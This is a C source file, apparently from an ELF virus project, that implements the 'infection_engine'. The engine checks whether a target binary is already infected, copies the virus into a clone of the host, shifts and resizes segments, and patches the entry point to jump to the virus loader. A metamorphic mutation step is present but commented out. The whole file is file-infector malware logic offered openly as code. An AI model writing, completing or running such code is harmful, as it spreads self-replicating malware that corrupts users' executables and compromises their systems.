#include "virus.h"
#include "utils.h"
#include "errors.h"
#include "compiler_utils.h"

static bool	adjust_sizes(struct entry *clone_entry,
			size_t shift_amount, size_t full_virus_size)
{
	clone_entry->safe_shdr->sh_size += full_virus_size;
	clone_entry->safe_phdr->p_filesz += shift_amount;
	clone_entry->safe_phdr->p_memsz += shift_amount;

	// if (clone_entry->safe_shdr->sh_type == SHT_NOBITS)
	// {
	// 	clone_entry->safe_shdr->sh_type = SHT_PROGBITS;
	// 	clone_entry->safe_phdr->p_flags |= PF_X;
		// clone_entry->safe_phdr->p_filesz += clone_entry->safe_shdr->sh_size;
		// clone_entry->safe_phdr->p_memsz  += clone_entry->safe_shdr->sh_size;
	// }
	return true;
}

static bool	define_shift_amount(const struct entry *file_entry,
			size_t *shift_amount, size_t full_virus_size)
{
	// const size_t	p_filesz        = file_entry->safe_phdr->p_filesz;
	// const size_t	p_offset        = file_entry->safe_phdr->p_offset;
	// const size_t	segment_end     = p_offset + p_filesz;
	// const size_t	segment_padding = segment_end - file_entry->payload_offset;
	//
	// if (full_virus_size < segment_padding)
	// {
	// 	*shift_amount = 0;
	// 	return true;
	// }

	const size_t	p_memsz = file_entry->safe_phdr->p_memsz;
	const size_t	p_align = file_entry->safe_phdr->p_align;

	// shift_amount aligned to Elf64 Segments alignement requirements
	*shift_amount = ALIGN(full_virus_size, PAGE_ALIGNMENT);

	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;

	if (end_padding > p_align)
		return errors(ERR_VIRUS, _ERR_V_NOT_ENOUGH_PADDING);

	return true;
}

bool		infection_engine(struct virus_header *vhdr,
			struct safe_ptr file_ref, struct safe_ptr clone_ref,
			size_t *shift_amount)
{
	struct entry	file_entry;
	struct entry	clone_entry;
	const size_t	*loader_offset   = &file_entry.payload_offset;          // init by <find_entry>
	uint64_t	*seed            = &vhdr->seed;                         // changed by <generate_seed>
	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_clone>

	if (!find_entry(&file_entry, file_ref, *full_virus_size)
	|| !not_infected(&file_entry, file_ref)
	|| !copy_virus_to_clone(clone_ref, *loader_offset, vhdr)
	|| !generate_seed(seed, file_ref)
	// || !metamorph_clone(clone_ref, *loader_offset, full_virus_size, vhdr)
	|| !define_shift_amount(&file_entry, shift_amount, *full_virus_size)
	|| !copy_client_to_clone(clone_ref, file_ref, *loader_offset, *shift_amount)
	|| !adjust_references(clone_ref, *shift_amount, *loader_offset)
	|| !find_entry(&clone_entry, clone_ref, *full_virus_size)
	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
	|| !setup_virus_header(clone_ref, *loader_offset, *vhdr)
	|| !change_entry(clone_ref, &file_entry, vhdr->dist_jmpclient_loader))
		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);

	return true;
}
